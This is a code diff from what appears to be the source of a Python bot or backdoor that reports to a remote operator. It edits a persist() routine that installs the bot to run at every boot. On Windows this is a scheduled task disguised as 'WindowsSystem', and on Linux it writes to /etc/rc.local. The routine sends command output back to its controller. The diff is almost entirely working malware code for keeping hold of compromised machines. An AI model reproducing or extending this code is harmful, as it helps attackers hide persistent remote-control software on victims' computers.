@@ -241,18 +241,20 @@ def admin(cmd): #add/remove admins
 def persist(): #try to persist bot; for freebsd, make file, place in /usr/local/etc/rc.d/
 	print "argv0 is '%s'" % argv[0]
 	print "cwd is '%s'" % os.getcwd()
-	script = os.getcwd() + "\\" + argv[0]
-	print "script is '%s'" % script
+	pwd = os.getcwd()
 	if operatingSystem == "windows":
-		# sendData("I'm on windows boss...")
+		script = pwd + "\\" + argv[0]
+		# print "script is '%s'" % script
 		output = execute("schtasks /Create /SC ONSTART /TN WindowsSystem /TR " + script)
 		sendData(output)
 		return
 	elif operatingSystem == "darwin": #if mac
 		sendData("i'm on a mac. you know the deal.")
+		script = pwd + "/" + argv[0]
 		#looking into launchd and launchctl. ugh! why did they get rid of cron? stupid xmls
 		return
 	else:
+		script = pwd + "/" + argv[0]
 		if operatingSystem == "linux": #if linux
 			path = "/etc/rc.local"
 		# elif operatingSystem == "freebsd": #if freebsd
